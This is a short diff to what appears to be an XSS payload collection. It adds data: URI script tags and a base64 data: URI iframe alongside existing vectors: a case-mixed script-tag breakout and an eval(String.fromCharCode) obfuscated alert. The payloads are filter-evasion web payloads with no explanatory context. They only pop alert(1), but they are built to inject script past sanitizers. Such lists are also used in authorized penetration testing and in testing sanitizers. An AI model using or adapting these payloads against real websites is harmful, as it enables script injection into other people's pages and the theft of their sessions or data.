@@ -7,6 +7,9 @@
 '"><sCrIpt>alert(1)</scRipT>
 
 # jsfuck
+<script src="data:text;base64,cHJpbnQ="></script>
+<script src="data:text;alert(1)"></script>
+<iframe src="data:text/html;base64,PGgxPnRlc3RfaGk8L2gxPg==">
 
 //  alert(1)
 eval(String.fromCharCode(97,108,101,114,116,40,49,41))
